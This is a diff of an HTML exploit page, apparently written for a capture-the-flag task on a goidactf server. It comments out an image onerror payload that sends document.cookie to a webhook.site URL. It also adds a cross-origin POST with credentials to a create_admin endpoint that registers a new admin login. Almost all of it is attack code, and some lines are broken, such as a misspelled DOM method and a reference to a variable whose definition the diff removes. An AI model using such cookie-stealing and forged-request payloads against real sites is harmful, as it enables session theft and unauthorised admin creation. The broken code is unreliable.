@@ -3,13 +3,10 @@
                 <body>
 
                     <a href="https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q=" target="frame" id="link">Go to admin login</a>
-                    <img src="x" onerror="fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie)" alt="">
-         
+                    <!-- <img src="x" onerror="fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie)" alt="">
+          -->
 <script>
-   const iframe = document.getElementsByName('frame')[0];
-const doc = iframe.contentWindow.document;
-const input = doc.getElementById("LoginInput");
-input.value = "test";
+
 const res = await fetch('https://tasks.goidactf.ru:20079/create_admin',
 {
     method:'POST',
@@ -19,7 +16,7 @@ const res = await fetch('https://tasks.goidactf.ru:20079/create_admin',
         },
     credentials:'include',
     mode:'no-cors',
-    body:
+    body:'new_admin_login=juuzo'
 })
 const text = await res.text();
 doc.getElementByTagName("button")[0].click();
